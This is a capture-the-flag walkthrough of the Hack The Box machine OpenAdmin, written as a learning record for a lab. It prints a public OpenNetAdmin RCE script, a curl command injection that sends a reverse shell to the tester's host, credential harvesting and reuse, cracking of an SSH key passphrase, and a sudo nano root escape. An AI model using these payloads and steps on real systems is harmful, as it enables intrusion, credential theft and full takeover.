---
title: OpenAdmin
tags:
  - fuzzing
  - ssh
  - john
  - sudo
  - gtfobins
  - opennetadmin
---
OpenAdmin is an easy difficulty Linux machine that features an outdated OpenNetAdmin CMS instance. The CMS is exploited to gain a foothold, and subsequent enumeration reveals database credentials. These credentials are reused to move laterally to a low privileged user. This user is found to have access to a restricted internal application. Examination of this application reveals credentials that are used to move laterally to a second user. A sudo misconfiguration is then exploited to gain a root shell.

## Nmap

As usual, we first run nmap scan and get http on port 80 and ssh on port 22.

```bash
❯ nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.136.167

22/ssh
80/http

❯ nmap -p22,80 -sCV 10.129.136.167

PORT  STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We scan the host with gobuster to enumerate hidden directories.

```bash
❯ gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.129.136.167/ -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.136.167/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/music                (Status: 301) [Size: 316] [--> http://10.129.136.167/music/]
```

And we got a hit, `/music`. Let's see what's in there

![](../images/openadmin1.png)

Nothing interesting at first, but when we try to login it redirects us to [OpenNetAdmin](https://opennetadmin.com/). 

![](../images/openadmin2.png)

The version that is shown is old. Looking for public exploits, we find that it is vulnerable to Remote Code Execution.

```bash
❯ searchsploit OpenNetAdmin
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution           | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasp | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution             | php/webapps/47691.sh
-------------------------------------------------------- ---------------------------------

❯ searchsploit -x php/webapps/47691.sh
```

```bash
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

The script looks easy to repy, I'll first try to execute `ifconfig` and if it works, we then try a reverse shell.

```bash
❯ curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo;ifconfig&xajaxargs[]=ping" http://10.129.136.167/ona/
```

```html
  <pre style="padding: 4px;font-family: monospace;">
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.136.167  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb0:be91  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb0:be91  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:be:91  txqueuelen 1000  (Ethernet)
        RX packets 99282  bytes 6727143 (6.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 75094  bytes 6421308 (6.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 11863  bytes 942899 (942.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 11863  bytes 942899 (942.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

</pre>
```

It worked! Let's set up a listener on port 80 with `netcat` to catch the reverse shell.

```bash
❯ nc -lvnp 80
```

Payload used: `bash -c 'bash -i >& /dev/tcp/10.10.14.178/80 0>&1` (URL encode the `&`).

```bash
❯ curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo;bash -c 'bash -i >%26 /dev/tcp/10.10.14.178/80 0>%261'&xajaxargs[]=ping" http://10.129.136.167/ona/
```

I'll threat my terminal so I could then do `CTRL + C` and it won't broke.

```bash
www-data@openadmin:/opt/ona/www$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@openadmin:/opt/ona/www$ ^Z
❯ stty raw -echo; fg
[1]  + continued  ncat -lvnp 80
                               reset xterm

www-data@openadmin:/opt/ona/www$ export TERM=xterm
www-data@openadmin:/opt/ona/www$ export SHELL=bash
```

Looking for interesting files in the folder we are, we see that there are so much places to look.

```bash
www-data@openadmin:/opt/ona/www$ ls
config
images
local
modules
workspace_plugins
config_dnld.php
include
login.php
plugins
dcm.php
index.php
logout.php
winc
```

So, instead of going one by one, I'll just try to get a password doing the following.

```bash
www-data@openadmin:/opt/ona/www$ grep -ri pass

dcm.php:// If no user name is passed in then use dcm.pl as the login name
dcm.php:// be careful as this currently does not require a password.
local/config/database_settings.inc.php:        'db_passwd' => 'n1nj4W4rri0R!',
winc/display_domain_server.inc.php:    // It expects to be passed the domain name as domain= to the module
winc/app_plugin_list.inc.php://     call is made to display_list(), this time passing a search
```

So we got a password `'db_passwd' => 'n1nj4W4rri0R!'`

```bash
www-data@openadmin:/opt/ona/www$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

Let's try it with `joanna` and then with `jimmy`

```bash
www-data@openadmin:/opt/ona/www$ su joanna 
Password: n1nj4W4rri0R!
su: Authentication failure
www-data@openadmin:/opt/ona/www$ su jimmy 
Password: n1nj4W4rri0R!
jimmy@openadmin:/opt/ona/www$ 
```

Got it, doing some recon we find that port `52846` is running.

```bash
jimmy@openadmin:/opt/ona/www$ ss -nltp
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         128               127.0.0.1:52846            0.0.0.0:*       
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
LISTEN   0         128                       *:80                     *:*       
LISTEN   0         128                    [::]:22                  [::]:*       
```

```bash
jimmy@openadmin:/opt/ona/www$ ls /etc/apache2/sites-enabled/
internal.conf  openadmin.conf

jimmy@openadmin:/opt/ona/www$ cat /etc/apache2/sites-enabled/internal.conf 
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

And looking for another site in Apache, we find out that there is another one called `internal.conf`.

```
jimmy@openadmin:/var/www/internal$ ls
index.php  logout.php  main.php
```

Looking inside there is something interesting.

```
jimmy@openadmin:/var/www/internal$ cat main.php 
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

`$output = shell_exec('cat /home/joanna/.ssh/id_rsa');` That will be executed if we just do a `curl` to it.

```bash
jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

And boom, we got Joannas `id_rsa`, but it's encrypted.

```bash
❯ cat id_rsa_encrypt

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```

Let's try to get the password using [John The Ripper](https://www.openwall.com/john/).

```bash
❯ ssh2john id_rsa_encrypt > hash
❯ cat hash

id_rsa_encrypt:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b6[SNIP]
```

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
bloodninjas
```

`bloodninjas` is the password for the `id_rsa`, we can now log in as `joanna` using it.

```bash
❯ ssh joanna@10.129.136.167 -i id_rsa_encrypt
Enter passphrase for key 'id_rsa_encrypt': bloodninjas
joanna@openadmin:~$ cat user.txt 
8343c1907e5be96627ebce7b19ceba64
```

Looking for privileges, we can run `nano` as sudo.

```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Easy privilege escalation, looking at [GTFObins](https://gtfobins.github.io/gtfobins/nano/#sudo)

```
joanna@openadmin:~$ sudo /bin/nano /opt/priv
CTRL + r
CTRL + x
reset; sh 1>&0 2>&0
```

![](../images/openadmin4.png)

```
root@openadmin:/home/joanna# cat ~/root.txt
2dac735cb9a245d1ca3c88970df6a5dc
```

We got the root flag.

**References**
- https://app.hackthebox.com/machines/OpenAdmin